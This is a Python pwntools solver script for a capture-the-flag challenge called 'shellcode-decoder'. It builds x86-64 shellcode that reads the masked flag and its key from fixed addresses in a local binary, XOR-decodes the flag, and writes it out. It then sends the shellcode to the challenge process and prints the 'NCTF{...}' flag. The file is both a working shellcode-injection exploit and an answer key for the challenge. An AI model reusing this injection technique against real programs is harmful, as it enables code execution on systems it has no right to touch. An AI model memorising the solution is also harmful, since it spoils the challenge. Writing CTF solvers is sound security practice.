#!/usr/bin/env python3
"""Solver for shellcode-decoder.

The program masks the flag section with a random per-run byte r and stores
dkey = K ^ r, so the effective key only exists at runtime; a static XOR of the
file does not work. It then executes attacker bytes from an RWX buffer.

Our shellcode reads enc[] and dkey from their fixed (no-PIE) addresses, XORs
each enc byte with dkey (recovering the flag), and write(2)s it to stdout.
"""
import os
import re

from pwn import ELF, asm, context, process

context.arch = "amd64"
context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "chall")


def main() -> None:
    elf = ELF(BIN, checksec=False)
    enc = elf.symbols["enc"]
    dkey = elf.symbols["dkey"]
    length = int.from_bytes(elf.read(elf.symbols["enc_len"], 4), "little")

    sc = asm(
        f"""
        mov rbx, {enc}
        movzx r8, byte ptr [{dkey}]
        mov rcx, {length}
        xor rdx, rdx
    decode:
        mov al, [rbx + rdx]
        xor al, r8b
        mov [rbx + rdx], al
        inc rdx
        cmp rdx, rcx
        jne decode
        mov rax, 1
        mov rdi, 1
        mov rsi, {enc}
        mov rdx, {length}
        syscall
        mov rax, 60
        xor rdi, rdi
        syscall
    """
    )

    p = process(BIN)
    p.recvline()  # addresses line
    p.recvline()  # "send shellcode:"
    p.send(sc)
    out = p.recvall(timeout=5)
    p.close()

    m = re.search(rb"NCTF\{[^}]*\}", out)
    assert m, f"no flag in output: {out!r}"
    print(m.group(0).decode())


if __name__ == "__main__":
    main()
